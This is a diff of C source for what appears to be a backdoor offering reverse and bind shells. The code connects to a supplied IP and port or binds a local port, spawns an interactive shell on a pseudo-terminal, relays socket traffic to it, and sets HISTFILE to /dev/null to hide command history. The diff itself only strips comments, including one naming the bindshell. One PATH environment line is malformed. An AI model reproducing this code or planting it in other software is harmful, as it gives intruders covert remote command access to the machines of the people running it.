@@ -35,14 +35,12 @@ int create_conn(char* ip, int port)
     struct sockaddr_in serv_info = { 0 };
     serv_info.sin_family = AF_INET;
     serv_info.sin_port = htons(port);
-    //serv_info.sin_addr.s_addr = inet_addr(ip);
     serv_info.sin_addr.s_addr = inet_addr(ip);
-    //serv_info.sin_addr.s_addr = resolve_ip(ip);
 
     return (connect(s0, (struct sockaddr*)&serv_info, sizeof(serv_info)) == 0 ? s0 : -1);
 }
 
-int return_conn(int port) // bind to a port for bindshell
+int return_conn(int port) 
 {
     int s0 = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in serv_info = { 0 };
@@ -85,7 +83,7 @@ bool cleanup_tty(int socket, int master)
 bool open_term(int s0)
 {
     fd_set comm = { 0 };
-    int master=0, slave=0, pid=0; // master == pty, tty == slave
+    int master=0, slave=0, pid=0; 
 
     if (open_pty(&master, &slave) && ttyname(slave) != NULL) {
         struct winsize ws = {0};
@@ -93,9 +91,7 @@ bool open_term(int s0)
         printf("Opened PTY with master/slave, current tty name: %s\n", ttyname(slave));
         #endif
 
-        /*
-        env variables
-        */
+       
         putenv("HISTFILE=/dev/null");
         putenv("PATH:/usr/local/sbin:/usr/sbin:/sbin:/bin:/usr/local/bin:/usr/bin");
         putenv("TERM=linux");
@@ -107,7 +103,7 @@ bool open_term(int s0)
         ws.ws_xpixel = 0;
         ws.ws_ypixel = 0;
 
-        if (ioctl(master, TIOCSWINSZ, &ws) != 0) { // send the config to the device XD
+        if (ioctl(master, TIOCSWINSZ, &ws) != 0) { 
             #ifdef _DEBUG
             perror("iotcl");
             #endif
@@ -122,7 +118,7 @@ bool open_term(int s0)
             return false;
         }
 
-        if (pid == 0) { // slave
+        if (pid == 0) {
             close(master);
             close(s0);
             ioctl(slave, TIOCSCTTY, NULL);
@@ -143,7 +139,7 @@ bool open_term(int s0)
             execl(SHELL, "-i", NULL);
             return true;
         }
-        else { // master
+        else {
             close(slave);
             write(master, "stty -echo\n", 11);
             send(s0, banner, strlen(banner), 0);
@@ -169,13 +165,13 @@ bool open_term(int s0)
                     break;
                 }
 
-                if (FD_ISSET(s0, &comm)) { // write command
+                if (FD_ISSET(s0, &comm)) { 
                     recv(s0, message, sizeof(message), 0);
                     write(master, message, strlen(message));
                     if (strcmp(message, "^C\r\n") == 0 || strcmp(message, "^C\n") == 0) //https://stackoverflow.com/questions/2195885/how-to-send-ctrl-c-control-character-or-terminal-hangup-message-to-child-process
                     {
                         char ctrl_c = 0x003;
-                        write(master, &ctrl_c, 1); // kill dat hoe
+                        write(master, &ctrl_c, 1);
                     }
                     else if (strcmp(message, "exit\r\n") == 0 || strcmp(message, "exit\n") == 0) {
                         char* bye_msg = "Exiting.\r\n";
